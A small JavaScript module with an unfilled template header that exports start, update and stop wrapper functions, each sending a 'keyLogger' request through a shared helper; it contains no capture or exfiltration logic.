/*
 * @Author: your name
 * @Date: 2020-09-07 17:22:39
 * @LastEditTime: 2020-09-10 20:52:16
 * @LastEditors: your name
 * @Description: In User Settings Edit
 * @FilePath: \my-project\src\main\Connect\request\keylogger.js
 */
import { sendRequest } from '../index'

export default{
  startKeyLogger: () => sendRequest('keyLogger', { method: 'start' }),
  updateKeyLogger: () => sendRequest('keyLogger', { method: 'update' }),  
  stopKeyLogger: () => sendRequest('keyLogger', { method: 'stop' })
}
